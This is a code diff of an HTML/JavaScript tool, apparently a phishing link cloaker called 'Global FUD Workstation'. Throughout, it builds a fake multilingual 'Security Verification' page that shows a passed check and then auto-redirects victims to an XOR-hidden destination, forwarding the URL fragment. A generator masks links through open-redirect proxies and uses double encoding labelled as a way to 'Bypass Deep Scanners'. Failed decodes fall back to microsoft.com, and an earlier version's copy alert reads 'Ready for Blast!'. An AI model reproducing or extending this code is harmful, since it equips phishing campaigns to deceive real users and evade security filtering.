@@ -16,23 +16,18 @@
             <div id="scanHeader" style="font-size: 18px; font-weight: 600; color: #333; margin-bottom: 10px;">Security Verification</div>
             <div id="spinner" style="border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
             <div id="scanStatus" style="font-size: 14px; color: #666; line-height: 1.6;">Verifying destination...</div>
-            
-            <div id="manualProceed" style="display:none; margin-top: 25px; border-top: 1px solid #eee; padding-top: 20px;">
-                <p id="clickText" style="font-size: 11px; color: #666; margin-bottom: 15px;">Verification complete.</p>
-                <button id="btnText" onclick="handleRedirect()" style="background: #0067b8; color: white; border: none; padding: 10px 24px; border-radius: 2px; font-size: 14px; cursor: pointer; font-weight: 600;">Continue</button>
-            </div>
         </div>
     </div>
 
     <div id="generatorUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white;">
         <div style="width: 100%; max-width: 650px; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155;">
             <h2 style="color:#38bdf8; margin-top:0;">Global FUD Workstation</h2>
-            <p style="font-size:12px; color:#94a3b8;">1. Worker Link (Stage 1):</p>
-            <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;">
-            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE GITHUB PAYLOAD</button>
+            <p style="font-size:12px; color:#94a3b8;">1. Target URL (Decrypted Destination):</p>
+            <input type="text" id="workerLink" placeholder="https://your-final-link.com/page" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;">
+            <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE BASE PAYLOAD</button>
             <div id="stage2Output" style="margin-top: 10px; padding: 10px; background: #020617; color: #94a3b8; font-size: 10px; word-break: break-all; display: none;"></div>
 
-            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Final Redirect Base:</p>
+            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Final Masking (Redirect Base):</p>
             <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://site.com/proxy?url=">
             
             <div style="background: #0f172a; padding: 15px; border-radius: 4px; margin: 10px 0; border: 1px solid #334155;">
@@ -44,7 +39,7 @@
                 </div>
                 <hr style="border:0; border-top: 1px solid #334155; margin: 15px 0;">
                 <label style="font-size:12px; display: flex; align-items: center; gap: 8px; cursor: pointer;">
-                    <input type="checkbox" id="doubleEncode"> 🛡️ Enable Double-Encode (Bypass Deep Scanners)
+                    <input type="checkbox" id="doubleEncode"> 🛡️ Double-Encode (Bypass Deep Scanners)
                 </label>
             </div>
             <button onclick="mergeFinal()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINALIZE MASKED LINK</button>
@@ -63,83 +58,93 @@
         const payload = params.get('p');
         let decryptedUrl = "";
 
-        // 1. GLOBAL DICTIONARY
         const dict = {
-            'en': { h: "Security Verification", s: "Verifying destination...", c: "Verification complete.", b: "Continue" },
-            'it': { h: "Verifica di Sicurezza", s: "Verifica della destinazione...", c: "Verifica completata.", b: "Continua" },
-            'fr': { h: "Vérification de Sécurité", s: "Vérification de sécurité...", c: "Vérification terminée.", b: "Continuer" },
-            'de': { h: "Sicherheitsüberprüfung", s: "Ziel wird überprüft...", c: "Überprüfung abgeschlossen.", b: "Fortfahren" },
-            'es': { h: "Verificación de Seguridad", s: "Verificando destino...", c: "Verificación completada.", b: "Continuar" },
-            'pt': { h: "Verificação de Segurança", s: "Verificando destino...", c: "Verificação completa.", b: "Continuar" },
-            'ru': { h: "Проверка безопасности", s: "Проверка адреса...", c: "Проверка завершена.", b: "Продолжить" }
+            'en': { h: "Security Verification", s: "Verifying destination..." },
+            'it': { h: "Verifica di Sicurezza", s: "Verifica della destinazione..." },
+            'fr': { h: "Vérification de Sécurité", s: "Vérification de sécurité..." },
+            'de': { h: "Sicherheitsüberprüfung", s: "Ziel wird überprüft..." },
+            'es': { h: "Verificación de Seguridad", s: "Verificando destino..." },
+            'pt': { h: "Verificação de Segurança", s: "Verificando destino..." },
+            'ru': { h: "Проверка безопасности", s: "Проверка адреса..." }
         };
 
         const userLang = (navigator.language || navigator.userLanguage).split('-')[0];
         const lang = dict[userLang] || dict['en'];
 
-        function handleRedirect() { if(decryptedUrl) window.location.replace(decryptedUrl); }
+        function handleRedirect() { 
+            if(decryptedUrl) {
+                const fragment = window.location.hash; 
+                window.location.replace(decryptedUrl + fragment); 
+            } 
+        }
 
-        // 2. ROUTING LOGIC
         if (payload) {
             document.getElementById('bouncerUI').style.display = 'flex';
             document.getElementById('holdScreen').remove();
             
-            // Set Language
             document.getElementById('scanHeader').innerText = lang.h;
             document.getElementById('scanStatus').innerText = lang.s;
-            document.getElementById('clickText').innerText = lang.c;
-            document.getElementById('btnText').innerText = lang.b;
 
             setTimeout(() => {
                 try {
-                    const decodedRaw = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+                    let b64 = payload.replace(/-/g, '+').replace(/_/g, '/');
+                    while (b64.length % 4) b64 += '=';
+                    
+                    const decodedRaw = atob(b64);
                     const actualEncrypted = decodedRaw.substring(15); 
                     let dest = "";
                     for (let i = 0; i < actualEncrypted.length; i++) {
                         dest += String.fromCharCode(actualEncrypted.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
                     }
                     decryptedUrl = dest;
+                    
                     document.getElementById('spinner').style.display = 'none';
-                    document.getElementById('scanStatus').innerText = "100% Safe";
-                    document.getElementById('manualProceed').style.display = 'block';
-                    setTimeout(handleRedirect, 2500); // Auto-redirect after button appears
-                } catch(e) { window.location.replace("https://www.microsoft.com"); }
-            }, 3500);
+                    document.getElementById('scanStatus').innerText = "Security check passed. Redirecting...";
+                    
+                    // 3-SECOND AUTOMATIC REDIRECT
+                    setTimeout(handleRedirect, 3000); 
+                } catch(e) { 
+                    window.location.replace("https://www.microsoft.com"); 
+                }
+            }, 2000); 
         } else {
             document.getElementById('generatorUI').style.display = 'flex';
             document.getElementById('holdScreen').remove();
         }
 
-        // 3. WORKSTATION LOGIC
         function makeStage2() {
             const input = document.getElementById('workerLink').value;
             if(!input) return;
             let salt = "";
             const chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
             for (let i = 0; i < 15; i++) { salt += chars.charAt(Math.floor(Math.random() * chars.length)); }
+            
             let encrypted = "";
             for (let i = 0; i < input.length; i++) {
                 encrypted += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
             }
+            
             const finalPayload = btoa(salt + encrypted).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-            document.getElementById('stage2Output').innerText = window.location.origin + window.location.pathname + "?p=" + finalPayload;
+            const finalUrl = window.location.origin + window.location.pathname + "?p=" + finalPayload;
+            
+            document.getElementById('stage2Output').innerText = finalUrl;
             document.getElementById('stage2Output').style.display = 'block';
         }
 
         function mergeFinal() {
             const base = document.getElementById('redirectBase').value;
-            const github = document.getElementById('stage2Output').innerText;
+            const link = document.getElementById('stage2Output').innerText;
             const level = document.querySelector('input[name="encLevel"]:checked').value;
             const isDouble = document.getElementById('doubleEncode').checked;
-            if(!base || !github) return;
+            if(!base || !link) return;
 
-            let path = github;
+            let path = link;
             if (level === "standard") {
-                path = encodeURIComponent(github);
+                path = encodeURIComponent(link);
             } else if (level === "hex") {
                 let hex = "";
-                for (let i = 0; i < github.length; i++) {
-                    hex += "%" + github.charCodeAt(i).toString(16).padStart(2, '0');
+                for (let i = 0; i < link.length; i++) {
+                    hex += "%" + link.charCodeAt(i).toString(16).padStart(2, '0');
                 }
                 path = hex;
             }
@@ -150,7 +155,9 @@
         }
 
         function copyToClipboard() {
-            navigator.clipboard.writeText(document.getElementById('finalOutput').innerText).then(() => { alert("Ready for Blast!"); });
+            navigator.clipboard.writeText(document.getElementById('finalOutput').innerText).then(() => { 
+                alert("Link Copied!"); 
+            });
         }
     </script>
 </body>
